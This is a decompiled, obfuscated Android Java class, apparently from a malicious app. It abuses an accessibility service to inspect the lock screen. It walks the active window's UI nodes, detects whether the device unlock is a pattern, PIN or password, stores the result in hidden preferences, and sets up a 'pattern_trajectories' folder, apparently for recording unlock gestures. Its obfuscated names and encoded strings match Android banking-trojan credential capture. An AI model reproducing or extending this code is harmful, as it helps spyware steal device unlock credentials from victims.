package p000;

import android.app.KeyguardManager;
import android.content.SharedPreferences;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.StringUtil;
import java.io.File;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class nm0 {

    /* renamed from: a2 */
    public static final String f58657a2;

    /* renamed from: a3 */
    public static final List f58658a3;

    /* renamed from: a4 */
    public static final List f58659a4;

    /* renamed from: a5 */
    public static final List f58660a5;

    /* renamed from: a6 */
    public static final List f58661a6;

    /* renamed from: a0 */
    public final dqtvuisjd f58662a0;

    /* renamed from: a1 */
    public final SharedPreferences f58663a1;

    static {
        new lm0(null);
        f58657a2 = StringUtil.m212470a0("O1gCKVo3HipoNS5NFDlZMQMg");
        f58658a3 = dh0.f55775c5;
        f58659a4 = dh0.f55773c3;
        f58660a5 = dh0.f55772c2;
        f58661a6 = dh0.f55774c4;
    }

    public nm0(dqtvuisjd dqtvuisjdVar) {
        this.f58662a0 = dqtvuisjdVar;
        SharedPreferences sharedPreferences = dqtvuisjdVar.getSharedPreferences(f58657a2, 0);
        t60.m214694b5(sharedPreferences, "context.getSharedPrefere…ME, Context.MODE_PRIVATE)");
        this.f58663a1 = sharedPreferences;
        File file = new File(dqtvuisjdVar.getFilesDir(), "pattern_trajectories");
        if (file.exists()) {
            return;
        }
        file.mkdirs();
    }

    /* renamed from: a0 */
    public static void m214121a0(AccessibilityNodeInfo accessibilityNodeInfo, mm0 mm0Var, int i) {
        String lowerCase;
        String lowerCase2;
        String string;
        String string2;
        String string3;
        if (i > 10) {
            return;
        }
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String lowerCase3 = "";
            if (text == null || (string3 = text.toString()) == null) {
                lowerCase = "";
            } else {
                lowerCase = string3.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                lowerCase2 = "";
            } else {
                lowerCase2 = string2.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className != null && (string = className.toString()) != null) {
                lowerCase3 = string.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            m214124a3(lowerCase, lowerCase2, mm0Var);
            m214125a4(lowerCase3, accessibilityNodeInfo, mm0Var);
            m214123a2(lowerCase, lowerCase2, lowerCase3, mm0Var);
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    m214121a0(child, mm0Var, i + 1);
                    child.recycle();
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: a1 */
    public static String m214122a1(AccessibilityNodeInfo accessibilityNodeInfo) {
        mm0 mm0Var = new mm0();
        mm0Var.f58384a0 = false;
        mm0Var.f58385a1 = false;
        mm0Var.f58386a2 = false;
        mm0Var.f58387a3 = false;
        mm0Var.f58388a4 = false;
        mm0Var.f58389a5 = false;
        mm0Var.f58390a6 = false;
        mm0Var.f58391a7 = false;
        mm0Var.f58392a8 = false;
        mm0Var.f58393a9 = 0;
        m214121a0(accessibilityNodeInfo, mm0Var, 0);
        return (mm0Var.f58390a6 || mm0Var.f58384a0) ? "pattern" : (mm0Var.f58389a5 && (mm0Var.f58385a1 || mm0Var.f58388a4)) ? "pin" : (mm0Var.f58388a4 && mm0Var.f58386a2) ? "password" : "none";
    }

    /* renamed from: a2 */
    public static void m214123a2(String str, String str2, String str3, mm0 mm0Var) {
        if (AbstractC0779a1.m213652a5(str, "systemui", false) || AbstractC0779a1.m213652a5(str3, "systemui", false)) {
            mm0Var.f58391a7 = true;
        }
        String lowerCase = (str + " " + str2).toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        List list = dh0.f55774c4;
        if (list == null || !list.isEmpty()) {
            Iterator it = list.iterator();
            while (it.hasNext()) {
                String lowerCase2 = ((String) it.next()).toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (AbstractC0779a1.m213652a5(lowerCase, lowerCase2, false)) {
                    mm0Var.f58392a8 = true;
                    return;
                }
            }
        }
    }

    /* renamed from: a3 */
    public static void m214124a3(String str, String str2, mm0 mm0Var) {
        List<String> list = f58658a3;
        if (list == null || !list.isEmpty()) {
            for (String str3 : list) {
                if (AbstractC0779a1.m213652a5(str, str3, false) || AbstractC0779a1.m213652a5(str2, str3, false)) {
                    mm0Var.f58384a0 = true;
                    break;
                }
            }
        }
        List<String> list2 = f58659a4;
        if (list2 == null || !list2.isEmpty()) {
            for (String str4 : list2) {
                if (AbstractC0779a1.m213652a5(str, str4, false) || AbstractC0779a1.m213652a5(str2, str4, false)) {
                    mm0Var.f58385a1 = true;
                    break;
                }
            }
        }
        List<String> list3 = f58660a5;
        if (list3 == null || !list3.isEmpty()) {
            for (String str5 : list3) {
                if (AbstractC0779a1.m213652a5(str, str5, false) || AbstractC0779a1.m213652a5(str2, str5, false)) {
                    mm0Var.f58386a2 = true;
                    break;
                }
            }
        }
        List<String> list4 = f58661a6;
        if (list4 == null || !list4.isEmpty()) {
            for (String str6 : list4) {
                if (AbstractC0779a1.m213652a5(str, str6, false) || AbstractC0779a1.m213652a5(str2, str6, false)) {
                    mm0Var.f58387a3 = true;
                    return;
                }
            }
        }
    }

    /* renamed from: a4 */
    public static void m214125a4(String str, AccessibilityNodeInfo accessibilityNodeInfo, mm0 mm0Var) {
        if (accessibilityNodeInfo.isPassword() || AbstractC0779a1.m213652a5(str, "password", false) || AbstractC0779a1.m213652a5(str, "edittext", false)) {
            mm0Var.f58388a4 = true;
        }
        if (AbstractC0779a1.m213652a5(str, "keypad", false) || AbstractC0779a1.m213652a5(str, "keyboard", false)) {
            mm0Var.f58389a5 = true;
        }
        if (AbstractC0779a1.m213652a5(str, "pattern", false) || AbstractC0779a1.m213652a5(str, "gesture", false)) {
            mm0Var.f58390a6 = true;
        }
        if (AbstractC0779a1.m213652a5(str, "button", false)) {
            mm0Var.f58393a9++;
        }
    }

    /* renamed from: a5 */
    public final String m214126a5() {
        String strM214122a1;
        AccessibilityNodeInfo rootInActiveWindow;
        try {
            Object systemService = this.f58662a0.getSystemService("keyguard");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.KeyguardManager");
            if (!((KeyguardManager) systemService).isKeyguardSecure()) {
                m214128a7("none");
                return "none";
            }
            String strM214127a6 = m214127a6();
            if (strM214127a6.equals("none")) {
                try {
                    dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
                    rootInActiveWindow = c0290a0 != null ? c0290a0.getRootInActiveWindow() : null;
                } catch (Exception e) {
                    t60.m214705c6("PasswordDetector", "UI检测失败", e);
                }
                if (rootInActiveWindow == null) {
                    strM214122a1 = "none";
                } else {
                    strM214122a1 = m214122a1(rootInActiveWindow);
                    rootInActiveWindow.recycle();
                }
                if (!strM214122a1.equals("none")) {
                    m214128a7(strM214122a1);
                    return strM214122a1;
                }
            }
            if (strM214127a6.equals("none")) {
                m214128a7("pin");
                return "pin";
            }
            m214128a7(strM214127a6);
            return strM214127a6;
        } catch (Exception e2) {
            t60.m214705c6("PasswordDetector", "密码类型检测失败", e2);
            return "none";
        }
    }

    /* renamed from: a6 */
    public final String m214127a6() {
        try {
            Object systemService = this.f58662a0.getSystemService("keyguard");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.KeyguardManager");
            if (!((KeyguardManager) systemService).isKeyguardSecure()) {
                return "none";
            }
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            AccessibilityNodeInfo rootInActiveWindow = c0290a0 != null ? c0290a0.getRootInActiveWindow() : null;
            if (rootInActiveWindow == null) {
                t60.m214726f4("PasswordDetector", "根节点不可用，回退为PIN");
                return "pin";
            }
            String strM214122a1 = m214122a1(rootInActiveWindow);
            rootInActiveWindow.recycle();
            int iHashCode = strM214122a1.hashCode();
            if (iHashCode != -791090288) {
                if (iHashCode == 110997) {
                    strM214122a1.equals("pin");
                    return "pin";
                }
                if (iHashCode == 1216985755 && strM214122a1.equals("password")) {
                    return "password";
                }
            } else if (strM214122a1.equals("pattern")) {
                return "pattern";
            }
            return "pin";
        } catch (Exception e) {
            t60.m214705c6("PasswordDetector", "UI分析失败", e);
            return "none";
        }
    }

    /* renamed from: a7 */
    public final void m214128a7(String str) {
        try {
            SharedPreferences.Editor editorEdit = this.f58663a1.edit();
            editorEdit.putString("password_type", str);
            editorEdit.putBoolean("has_password", !str.equals("none"));
            editorEdit.putLong("last_detection_time", System.currentTimeMillis());
            editorEdit.apply();
        } catch (Exception e) {
            t60.m214705c6("PasswordDetector", "保存检测结果失败", e);
        }
    }
}
